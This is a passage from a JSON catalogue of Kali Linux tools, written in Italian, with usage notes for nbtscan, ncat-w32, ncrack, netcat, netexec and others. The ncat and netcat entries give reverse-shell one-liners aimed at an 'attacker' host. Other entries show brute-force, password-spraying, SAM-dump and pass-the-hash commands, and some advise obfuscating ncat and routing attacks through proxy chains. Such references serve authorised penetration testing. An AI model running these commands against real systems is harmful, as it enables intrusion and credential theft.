192.168.1.0/24\n\n# Modalità quiet (solo risultati)\nnbtscan-unixwiz -q 192.168.1.0/24\n\n# Scan con timeout esteso per reti lente\nnbtscan-unixwiz -t 500 192.168.1.0/24\n\n# Output separato da tab per parsing\nnbtscan-unixwiz -s 192.168.1.0/24\n\n# Scan di range multipli\nnbtscan-unixwiz 192.168.1.0/24 10.0.0.0/24</code></pre><p>L'output di default mostra IP, nome NetBIOS, e informazioni sul dominio in formato tabulare facilmente integrabile con altri tool (grep, awk, cut).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Network Discovery</strong> in penetration test interni, è il tool più veloce per ottenere una lista di tutti i sistemi Windows attivi su una o più subnet, con informazioni sul loro ruolo nel dominio.</p><p>Per <strong>Active Directory Reconnaissance</strong>, permette di identificare rapidamente Domain Controller, file server, e workstation critiche prima di procedere con enumerazione LDAP o attacchi mirati.</p><p>Nella fase di <strong>Lateral Movement Planning</strong>, sapere quali sistemi sono presenti e quale ruolo hanno aiuta a pianificare il percorso di compromissione più efficace.</p><p>Per <strong>Network Segmentation Testing</strong>, verificare da quali VLAN è possibile raggiungere sistemi Windows in altri segmenti tramite query NetBIOS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico NetBIOS sulla porta 137/UDP è normale in ambienti Windows, ma uno scan sistematico di una subnet genera un pattern riconoscibile. IDS moderni possono correlare le query e identificare attività di reconnaissance.</p><p><strong>Impatto:</strong> Minimo sui sistemi target. Le query NetBIOS sono leggere e non causano carico significativo. Il traffico UDP può essere filtrato da firewall inter-VLAN.</p><p><strong>Mitigazioni:</strong> In ambienti con NetBIOS disabilitato (best practice moderna), lo scan non produrrà risultati. Considerare l'uso di LDAP query per ambienti più moderni. Il traffico non è cifrato e può essere monitorato in transito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "nbtscan",
    "name": "nbtscan",
    "version": "1.7.2",
    "icon": "../app/icons/nbtscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/nbtscan/",
    "desc": "Scansione NetBIOS per discovery di hostname, workgroup e utenti su reti Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>NBTScan</strong> è uno scanner specializzato per il protocollo NetBIOS Name Service (NBT-NS), fondamentale per la discovery in ambienti Windows e Active Directory. Interrogando la porta 137/UDP, estrae informazioni preziose come hostname, workgroup o dominio di appartenenza, utenti attualmente loggati, MAC address e servizi NetBIOS attivi. È uno strumento classico e affidabile, presente nel toolkit di ogni pentester per la fase di reconnaissance su reti Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NetBIOS Name Query:</strong> Invia richieste NBT-NS sulla porta 137/UDP per recuperare la tabella dei nomi NetBIOS di ogni host. Questa tabella contiene informazioni sul nome macchina, dominio/workgroup, e servizi registrati (file sharing, messenger, browser).</p><p><strong>User Detection:</strong> Identifica gli utenti attualmente loggati sui sistemi Windows interrogando il suffisso NetBIOS <03>. Informazione cruciale per identificare workstation di utenti privilegiati o sessioni amministrative attive.</p><p><strong>Service Flags Parsing:</strong> Decodifica i flag dei servizi NetBIOS per distinguere tra Domain Controller, server, workstation, e browser master. Permette di mappare rapidamente la gerarchia della rete Windows.</p><p><strong>MAC Address Extraction:</strong> Recupera l'indirizzo MAC hardware dell'interfaccia di rete, utile per fingerprinting e per identificare il vendor della scheda di rete (OUI lookup).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>NBTScan è estremamente semplice da usare. Accetta singoli IP, range CIDR, o file di target.</p><pre><code># Scan di una subnet intera\nnbtscan 192.168.1.0/24\n\n# Output human-readable con dettagli\nnbtscan -h 192.168.1.0/24\n\n# Verbose mode per troubleshooting\nnbtscan -v 192.168.1.0/24\n\n# Scan da file di target\nnbtscan -f targets.txt\n\n# Output in formato separato da virgole (CSV)\nnbtscan -s, 192.168.1.0/24\n\n# Timeout personalizzato per reti lente\nnbtscan -t 2 192.168.1.0/24</code></pre><p>L'output standard mostra IP, nome NetBIOS, utente loggato e MAC address in formato tabulare facilmente parsabile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Discovery Iniziale</strong> in penetration test interni, NBTScan è spesso il primo strumento eseguito per mappare rapidamente tutti i sistemi Windows presenti nella rete e identificare Domain Controller, server e workstation.</p><p>Per <strong>Active Directory Enumeration</strong>, permette di identificare la struttura del dominio, le trust relationship (osservando diversi domain name) e la distribuzione geografica dei sistemi prima di procedere con tool più invasivi.</p><p>Nella fase di <strong>Target Prioritization</strong>, identificare quali workstation hanno sessioni amministrative attive permette di focalizzare gli attacchi di credential theft su sistemi ad alto valore.</p><p>Per <strong>Network Inventory</strong>, anche i team IT lo utilizzano per audit rapidi dell'infrastruttura Windows.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query NetBIOS sono traffico relativamente comune in ambienti Windows, ma uno scan massivo di un'intera subnet può essere rilevato. Gli IDS possono correlare richieste multiple dalla stessa sorgente in breve tempo.</p><p><strong>Impatto:</strong> Lo scan è passivo dal punto di vista dei sistemi target (non causa carico o crash). Il traffico UDP può essere rate-limited da alcuni firewall.</p><p><strong>Mitigazioni:</strong> In ambienti moderni, NetBIOS è spesso disabilitato a favore di DNS puro. Verificare prima se il target utilizza ancora NBT-NS. Utilizzare delay tra le query (-t) per ridurre il profilo. Il traffico è cifrato zero, quindi intercettabile in transito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "ncat-w32",
    "name": "ncat-w32",
    "version": "5.59beta1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ncat-w32/",
    "desc": "Versione Windows di Ncat per trasferimenti di file e shell remote su target Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ncat-w32</strong> è la versione Windows di Ncat (netcat moderno). Binario standalone che funziona su Windows senza dipendenze. Usato per trasferimenti file, bind/reverse shell, e tunneling su sistemi Windows compromessi. Più potente del netcat originale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP/UDP:</strong> Connessioni entrambi i protocolli.</p><p><strong>SSL/TLS:</strong> Connessioni criptate.</p><p><strong>Shell:</strong> Bind e reverse shell.</p><p><strong>Proxy:</strong> Supporto SOCKS e HTTP proxy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Reverse shell su victim Windows\nncat.exe -e cmd.exe attacker 4444\n\n# Listener su attacker\nncat -lvnp 4444\n\n# Transfer file\n# Receiver: ncat -lvnp 8888 > file.exe\n# Sender: ncat.exe target 8888 < file.exe\n\n# Con SSL\nncat.exe --ssl -e cmd.exe attacker 4444</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-exploitation</strong>, shell su Windows.</p><p>Nel <strong>File Transfer</strong>, upload/download tool.</p><p><strong>Pivoting</strong> attraverso host compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> AV può flaggare ncat.exe. Network connection visibile. Process ncat.exe sospetto. Rinominare e offuscare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "ncrack",
    "name": "ncrack",
    "version": "0.7",
    "icon": "../app/icons/ncrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ncrack/",
    "desc": "Brute forcer di rete ad alte prestazioni per SSH, RDP, FTP, Telnet e altri protocolli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ncrack</strong> è un brute forcer di rete ad alte prestazioni sviluppato dal team Nmap, progettato specificamente per auditing di credenziali su larga scala. A differenza di altri tool simili, Ncrack utilizza un engine modulare con timing adattivo che si adegua dinamicamente alle condizioni di rete e alle risposte del target, massimizzando la velocità senza causare denial of service. Supporta nativamente i protocolli più critici: SSH, RDP, FTP, Telnet, HTTP(S), POP3, IMAP, SMB, VNC, SIP, Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, e WinRM. L'integrazione nativa con l'output di Nmap permette workflow automatizzati di reconnaissance-to-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol Engine:</strong> Supporta oltre 20 protocolli con moduli specifici ottimizzati per ciascun servizio. Ogni modulo implementa la logica di autenticazione nativa del protocollo, gestendo correttamente handshake, encryption negotiation, e response parsing.</p><p><strong>Adaptive Timing:</strong> Il sistema di timing si adatta in tempo reale basandosi su RTT, rate limiting del target, e condizioni di rete. Template predefiniti (paranoid, sneaky, polite, normal, aggressive, insane) o customizzazione fine-grained di timeout, delay, e parallelismo.</p><p><strong>Connection Pooling:</strong> Gestisce pool di connessioni persistenti dove possibile, riducendo overhead di handshake e aumentando throughput. Particolarmente efficace con SSH e RDP dove il connection setup è costoso.</p><p><strong>Session Resume:</strong> Salva automaticamente lo stato della sessione permettendo di riprendere scan interrotti. Utile per operazioni di lunga durata o quando è necessario dividere l'attività in finestre temporali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ncrack offre sintassi flessibile per target specification, compatibile con la notazione Nmap.</p><pre><code># SSH brute force con wordlist\nncrack -p 22 --user admin -P /usr/share/wordlists/rockyou.txt target.com\n\n# RDP con timing aggressivo\nncrack -p 3389 --user administrator -P passwords.txt -T4 target.com\n\n# Multiple services su stesso host\nncrack ssh://target.com rdp://target.com ftp://target.com\n\n# Multiple users e passwords\nncrack -p 22 -U users.txt -P passwords.txt 192.168.1.0/24\n\n# Import da Nmap XML output\nncrack -iX nmap_scan.xml -U users.txt -P pass.txt\n\n# Timing stealth per evitare detection\nncrack -p 22 --user root -P pass.txt -T2 --connection-limit 1 target.com\n\n# SMB con domain authentication\nncrack smb://target.com --user 'DOMAIN\\user' -P passwords.txt\n\n# Resume sessione precedente\nncrack --resume ncrack.restore\n\n# Output verbose e salvataggio\nncrack -v -oN results.txt -p 22 --user admin -P pass.txt target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Password Audit Aziendali</strong>, ncrack permette di verificare la robustezza delle credenziali su servizi critici come SSH bastions, jump servers RDP, e database. La capacità di testare subnet intere aiuta a identificare sistemi con password deboli o default.</p><p>Nel <strong>Penetration Testing</strong>, dopo la fase di enumeration, ncrack viene usato per attacchi credential-based su servizi identificati. L'integrazione con Nmap semplifica il workflow: scan servizi → export XML → ncrack su servizi autenticati.</p><p>Per <strong>Red Team Operations</strong>, i timing template stealth permettono di spalmare l'attacco su periodi prolungati evitando alert basati su volume. La funzione resume è critica per operazioni che devono rispettare finestre temporali specifiche.</p><p>Nella <strong>Compliance Verification</strong>, verifica che password policy aziendali siano effettivamente implementate testando resistenza a dictionary attack con wordlist comuni come rockyou.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Noise Profile:</strong> Brute force genera inevitabilmente molti tentativi di login falliti. Ogni tentativo viene loggato dal target e potenzialmente inviato a SIEM. Pattern riconoscibile: stesso source IP, sequenza di username/password, timing regolare.</p><p><strong>Account Lockout:</strong> Molti sistemi implementano lockout dopo N tentativi falliti. Questo può causare denial of service involontario bloccando account legittimi. Verificare policy prima di lanciare attack. Usare spray attack (few passwords, many users) invece di traditional brute force.</p><p><strong>Network Detection:</strong> IDS/IPS riconoscono pattern di brute force. Firewall possono implementare rate limiting automatico. Connection tracking identifica comportamenti anomali da singolo IP.</p><p><strong>Mitigazioni:</strong> Usare timing template sneaky/paranoid per ridurre rate. Limitare connessioni parallele con --connection-limit. Distribuire attack attraverso proxy chain o multiple source IP. Preferire password spraying con poche password comuni su molti account.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "netcat",
    "name": "netcat",
    "version": "1.10",
    "icon": "../app/icons/netcat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netcat/",
    "desc": "Swiss army knife delle reti: connessioni TCP/UDP, trasferimenti file e shell di base.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netcat</strong>, spesso chiamato \"Swiss Army knife delle reti\", è una delle utility più versatili e fondamentali per operazioni di rete su sistemi Unix/Linux. Permette di creare connessioni TCP e UDP arbitrarie, funzionando sia come client che come server. La sua semplicità e ubiquità (presente di default su quasi ogni sistema Unix) lo rendono lo strumento di riferimento per debugging di rete, trasferimento file ad-hoc, e creazione di shell durante penetration testing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP/UDP Client-Server:</strong> Può aprire connessioni verso qualsiasi host e porta (client mode) o mettersi in ascolto su una porta locale (server/listener mode). Supporta sia TCP che UDP, permettendo di testare qualsiasi servizio di rete.</p><p><strong>Data Piping:</strong> Tutto ciò che viene inviato su stdin viene trasmesso sulla connessione, e tutto ciò che arriva dalla connessione viene stampato su stdout. Questo permette di concatenare netcat con altri tool Unix per operazioni complesse.</p><p><strong>Basic Port Scanning:</strong> Con l'opzione -z (zero I/O mode), può verificare rapidamente quali porte sono aperte su un host senza stabilire connessioni complete.</p><p><strong>Shell Execution:</strong> Con l'opzione -e (non presente in tutte le versioni), può eseguire un programma alla connessione, permettendo di creare bind shell o reverse shell semplicissime.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi è minimale e i flag principali sono memorizzabili facilmente.</p><pre><code># Listener TCP sulla porta 4444\nnc -lvnp 4444\n\n# Connessione a un host\nnc target.com 4444\n\n# Reverse shell (dal target verso l'attacker)\n# Su attacker:\nnc -lvnp 4444\n# Su target:\nnc -e /bin/bash attacker_ip 4444\n\n# Bind shell (sul target, in ascolto)\nnc -lvnp 4444 -e /bin/bash\n\n# Trasferimento file\n# Receiver:\nnc -lvnp 8888 > received_file.bin\n# Sender:\nnc target 8888 < file_to_send.bin\n\n# Port scan base (TCP)\nnc -zv target.com 1-1000\n\n# Connessione UDP\nnc -u target.com 53\n\n# Banner grabbing\necho \"GET / HTTP/1.0\\r\\n\\r\\n\" | nc target.com 80</code></pre><p>Note: flag -e non disponibile su tutte le versioni (netcat-traditional vs netcat-openbsd). Su sistemi senza -e, usare named pipes o alternative come /dev/tcp bash built-in.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Penetration Testing</strong>, netcat è lo strumento primario per stabilire reverse shell dopo aver sfruttato una vulnerabilità. La sua presenza su quasi ogni sistema lo rende utilizzabile senza upload di tool aggiuntivi.</p><p>Per <strong>Network Debugging</strong>, permette di testare rapidamente connettività, verificare che servizi siano raggiungibili, e fare banner grabbing per identificare software in ascolto.</p><p>Nel <strong>File Transfer</strong> ad-hoc, quando non sono disponibili SCP o altri metodi, netcat permette di trasferire file binari tra host in pochi secondi.</p><p>Per <strong>Learning</strong>, la semplicità di netcat lo rende perfetto per capire i fondamenti dei socket TCP/UDP e delle connessioni di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffico in Chiaro:</strong> Netcat non implementa alcuna cifratura. Tutto il traffico, incluse shell e file trasferiti, è visibile in chiaro a chiunque possa intercettare la rete. Per operazioni sensibili, usare alternative cifrate come ncat (con SSL) o socat.</p><p><strong>Detection:</strong> Le connessioni netcat sono facilmente identificabili: processi nc in ascolto, connessioni su porte non standard, e pattern di traffico shell sono indicatori noti. EDR e network monitoring possono rilevare l'attività.</p><p><strong>Versioni:</strong> Esistono diverse implementazioni (traditional, OpenBSD, ncat) con funzionalità diverse. L'opzione -e è disponibile solo su netcat-traditional. Verificare quale versione è presente sul sistema target.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "netdiscover",
    "name": "netdiscover",
    "version": "0.21",
    "icon": "../app/icons/netdiscover-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netdiscover/",
    "desc": "Scanner ARP attivo/passivo per identificare host live su reti locali switched.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netdiscover</strong> è uno scanner ARP specializzato per la discovery di host su reti locali, particolarmente efficace in ambienti switched dove le tecniche basate su ICMP potrebbero fallire. Offre due modalità operative: attiva (invia ARP request) per scansioni rapide, e passiva (sniffa traffico ARP esistente) per reconnaissance stealth. Visualizza in tempo reale IP address, MAC address e vendor della scheda di rete, fornendo una mappa immediata di tutti i dispositivi presenti sulla LAN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Active ARP Scanning:</strong> Invia ARP request verso tutti gli indirizzi IP nel range specificato. Ogni host attivo risponde rivelando il proprio MAC address. Questa modalità è veloce ma genera traffico di rete visibile.</p><p><strong>Passive ARP Sniffing:</strong> Cattura passivamente tutto il traffico ARP che attraversa la rete senza inviare alcun pacchetto. Completamente invisibile, costruisce la mappa della rete osservando le comunicazioni esistenti tra gli host.</p><p><strong>OUI Vendor Lookup:</strong> Identifica automaticamente il produttore della scheda di rete basandosi sui primi 3 byte del MAC address (OUI - Organizationally Unique Identifier). Rivela il tipo di dispositivo (Apple, Dell, Cisco, VMware, etc.).</p><p><strong>Real-Time Interface:</strong> Interfaccia ncurses che si aggiorna in tempo reale mostrando nuovi host man mano che vengono scoperti, con contatori di pacchetti e statistiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Netdiscover richiede privilegi root per accedere ai raw socket. Supporta range CIDR o scansione dell'intera subnet.</p><pre><code># Scan attivo di una subnet\nsudo netdiscover -r 192.168.1.0/24\n\n# Modalità passiva (stealth, nessun traffico generato)\nsudo netdiscover -p\n\n# Specifica interfaccia di rete\nsudo netdiscover -i eth0 -r 10.0.0.0/24\n\n# Fast mode (meno accurato, più veloce)\nsudo netdiscover -f -r 192.168.1.0/24\n\n# Range multipli separati da virgola\nsudo netdiscover -r 192.168.1.0/24,10.0.0.0/24\n\n# Limita numero di nodi da scoprire\nsudo netdiscover -r 192.168.1.0/24 -c 50\n\n# Output non interattivo per scripting\nsudo netdiscover -r 192.168.1.0/24 -P -N</code></pre><p>L'output mostra una tabella con IP, MAC, conteggio pacchetti, lunghezza, e vendor per ogni host scoperto.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase iniziale di <strong>Internal Penetration Testing</strong>, netdiscover fornisce rapidamente una lista di tutti gli host attivi sulla rete locale, informazione essenziale per pianificare i successivi passi dell'assessment.</p><p>Per <strong>Wireless Security Assessment</strong>, dopo aver compromesso una rete WiFi, netdiscover mappa i client connessi rivelando dispositivi mobili, IoT, e workstation da targetizzare.</p><p>In modalità passiva per <strong>Stealth Reconnaissance</strong>, può costruire una mappa della rete senza generare alcun traffico, ideale quando la detection è una preoccupazione.</p><p>Per <strong>Network Inventory</strong> e troubleshooting, gli amministratori possono identificare rapidamente dispositivi rogue o non autorizzati sulla rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento Modalità Attiva:</strong> Lo scan ARP genera traffico broadcast che può essere rilevato da switch con port security, IDS, o tool come arpwatch. Il pattern di ARP request sequenziali è facilmente identificabile.</p><p><strong>Modalità Passiva Invisibile:</strong> La modalità -p non genera alcun traffico ed è completamente invisibile. Tuttavia, richiede tempo per costruire una mappa completa basandosi solo sul traffico esistente.</p><p><strong>Limitazioni Layer 2:</strong> ARP funziona solo a livello 2 (data link). Non può scoprire host su subnet diverse o attraverso router. Efficace solo sulla stessa VLAN/broadcast domain.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "netexec",
    "name": "netexec",
    "version": "1.4.0",
    "icon": "../app/icons/netexec-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netexec/",
    "desc": "Successore di CrackMapExec per pentesting AD: SMB, WinRM, LDAP, MSSQL execution.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>NetExec</strong> (nxc) è il successore ufficiale di CrackMapExec. Tool essenziale per pentesting Active Directory: enumeration, execution, credential spraying su SMB, WinRM, LDAP, MSSQL, SSH, RDP. Include moduli per dumping, lateral movement e post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-protocol:</strong> SMB, WinRM, LDAP, MSSQL, SSH.</p><p><strong>Credential Spray:</strong> Test password su multipli host.</p><p><strong>Execution:</strong> Remote code execution.</p><p><strong>Modules:</strong> Mimikatz, SAM dump, etc.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Password spray SMB\nnxc smb 192.168.1.0/24 -u user -p password\n\n# Enumeration LDAP\nnxc ldap dc.target.com -u user -p pass --users\n\n# WinRM execution\nnxc winrm target.com -u admin -p pass -x 'whoami'\n\n# Dump SAM\nnxc smb target -u admin -p pass --sam\n\n# Pass-the-hash\nnxc smb target -u admin -H NTHASH</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, enumeration e exploitation.</p><p>Nel <strong>Red Team</strong>, lateral movement.</p><p><strong>Credential Testing</strong> su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabile:</strong> Login events 4624/4625. SMB/WinRM traffic loggato. Spray genera molti eventi. EDR può rilevare moduli.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "netscanner",
    "name": "netscanner",
    "version": "0.6.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netscanner/",
    "desc": "Scanner di rete con interfaccia TUI per discovery host e servizi in tempo reale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netscanner</strong> è uno scanner di rete moderno con interfaccia TUI (Text User Interface) costruita con tecnologie Rust moderne. A differenza degli scanner tradizionali a riga di comando, offre una visualizzazione interattiva in tempo reale degli host e servizi scoperti, permettendo di monitorare il progresso della scansione e interagire con i risultati mentre vengono raccolti. Combina discovery ARP per la rete locale, port scanning TCP e identificazione servizi in un'unica interfaccia intuitiva e visivamente accattivante.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Interfaccia TUI Interattiva:</strong> Utilizza librerie Rust come tui-rs per creare un'interfaccia terminale ricca con pannelli, tabelle scrollabili e aggiornamento in tempo reale. Permette di navigare tra gli host scoperti, espandere dettagli sui servizi e filtrare risultati senza interrompere la scansione.</p><p><strong>ARP Discovery:</strong> Esegue sweep ARP sulla rete locale per identificare rapidamente tutti gli host attivi. Questa tecnica è più veloce e affidabile del ping sweep su reti dove ICMP è filtrato, mostrando anche dispositivi che non rispondono a ping.</p><p><strong>Port Scanning Asincrono:</strong> Implementa scanning TCP connect asincrono per massimizzare la velocità. Supporta scansione di porte singole, range o liste predefinite (top 100, top 1000) con parallelismo configurabile.</p><p><strong>Service Detection:</strong> Identifica i servizi in ascolto sulle porte aperte tramite banner grabbing e fingerprinting basilare, mostrando nome del servizio e versione quando disponibile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Netscanner si avvia da terminale e rileva automaticamente l'interfaccia di rete. Supporta navigazione con tastiera nell'interfaccia TUI.</p><pre><code># Avvia scanner con auto-detect interfaccia\nnetscanner\n\n# Specifica range di rete\nnetscanner -r 192.168.1.0/24\n\n# Usa interfaccia specifica\nnetscanner -i eth0\n\n# Scansiona porte specifiche\nnetscanner -r 10.0.0.0/24 -p 22,80,443,8080\n\n# Top 1000 porte\nnetscanner -r 192.168.1.0/24 --top-ports 1000</code></pre><p>Nell'interfaccia TUI: frecce per navigare, Enter per espandere dettagli host, Tab per cambiare pannello, q per uscire. I risultati possono essere esportati in formato JSON.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Discovery Visuale</strong>, netscanner offre un modo intuitivo per esplorare una rete sconosciuta, ideale durante le fasi iniziali di un assessment quando si vuole una panoramica rapida dell'infrastruttura.</p><p>Nel contesto di <strong>Learning e Training</strong>, l'interfaccia interattiva aiuta a comprendere i concetti di networking mostrando in tempo reale come gli host rispondono e quali servizi espongono.</p><p>Per <strong>Troubleshooting di Rete</strong>, permette agli amministratori di verificare rapidamente quali dispositivi sono attivi e quali servizi espongono senza dover interpretare output testuali complessi.</p><p>Durante <strong>CTF e Lab</strong>, la velocità e l'immediatezza visiva lo rendono perfetto per ambienti di pratica dove si vuole un feedback istantaneo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Netscanner genera traffico di rete attivo facilmente identificabile. L'ARP sweep è visibile a tool di monitoraggio come arpwatch. Il port scanning produce connessioni TCP che vengono loggate da firewall e IDS.</p><p><strong>Impatto:</strong> Lo scanning asincrono può generare un burst di traffico significativo. Su reti con rate limiting o IPS aggressivi può causare blocchi temporanei dell'IP sorgente.</p><p><strong>Mitigazioni:</strong> Utilizzare in ambienti autorizzati e di laboratorio. Ridurre il parallelismo con le opzioni appropriate se si vuole un profilo più basso. Non adatto per operazioni stealth su reti monitorate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "netsed",
    "name": "netsed",
    "version": "1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netsed/",
    "desc": "Proxy per modificare traffico di rete on-the-fly con regole di sostituzione pattern.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netsed</strong> è un proxy per modificare traffico TCP/UDP on-the-fly. Applica regole di sostituzione pattern (simili a sed) ai pacchetti che passano. Utile per testing, debugging, e attacchi MITM dove si vogliono alterare dati in transito senza interrompere la connessione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Replace:</strong> Sostituzioni regex-like.</p><p><strong>TCP/UDP:</strong> Supporto entrambi.</p><p><strong>Transparent:</strong> Proxy invisibile per endpoint.</p><p><strong>Multiple Rules:</strong> Regole concatenabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Proxy su porta 8080, forward a 80\nnetsed tcp 8080 target.com 80 's/oldstring/newstring'\n\n# Multiple sostituzioni\nnetsed tcp 8080 target 80 's/foo/bar' 's/baz/qux'\n\n# UDP proxy\nnetsed udp 5353 target 5353 's/pattern/replace'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Protocol Testing</strong>, modifica pacchetti al volo.</p><p>Nel <strong>MITM</strong>, altera dati in transito.</p><p><strong>Debugging</strong> di applicazioni di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MITM position:</strong> Richiede controllo del traffico. Modifiche visibili se analizzate. Utile principalmente in lab o con accesso LAN.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "netsniff-ng",
    "name": "netsniff-ng",
    "version": "0.6.9",
    "icon": "../app/icons/netsniff-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/netsniff-ng/",
    "desc": "Toolkit di sniffing ad alte prestazioni con zero-copy per cattura e analisi pacchetti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Netsniff-ng</strong> è un toolkit di networking ad alte prestazioni per Linux, ottimizzato per cattura e analisi di traffico su reti ad alta velocità (10Gbps e oltre). La caratteristica distintiva è l'utilizzo di tecniche zero-copy che bypassano il normale stack di rete del kernel, permettendo cattura wire-speed senza perdita di pacchetti anche su link saturi. Il progetto include una suite completa di tool: netsniff-ng per cattura, trafgen per traffic generation, flowtop per monitoring connessioni, ifpps per statistiche interfacce, bpfc per compilazione filtri BPF, curvetun per tunnel crittografati, e mausezahn per packet crafting. Essenziale per network forensics, security monitoring, e performance testing su infrastrutture enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero-Copy Capture:</strong> Utilizza memory-mapped ring buffer (PACKET_MMAP) per trasferire pacchetti dalla NIC allo userspace senza copie intermedie. Su hardware moderno raggiunge cattura wire-speed su 10Gbps+ con CPU usage minimo.</p><p><strong>Wire-Speed Performance:</strong> Progettato per ambienti dove tcpdump o wireshark perdono pacchetti. Su reti ad alto throughput, netsniff-ng mantiene cattura completa grazie a ottimizzazioni kernel-level e gestione efficiente della memoria.</p><p><strong>Toolkit Completo:</strong> Include trafgen (generatore di traffico programmabile), flowtop (monitor top-like di connessioni), ifpps (statistiche interfacce), bpfc (compilatore filtri BPF avanzato), curvetun (VPN leggera con curve25519), mausezahn (packet crafting).</p><p><strong>PCAP Compatibility:</strong> Output in formato pcap/pcap-ng standard, compatibile con Wireshark, tcpdump, Zeek, e tutti i tool di analisi. Supporta compressione on-the-fly e rotazione automatica dei file.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I tool della suite netsniff-ng richiedono privilegi root per raw socket access.</p><pre><code># NETSNIFF-NG - Cattura base\nsudo netsniff-ng -i eth0 -o capture.pcap\n\n# Cattura con filtro 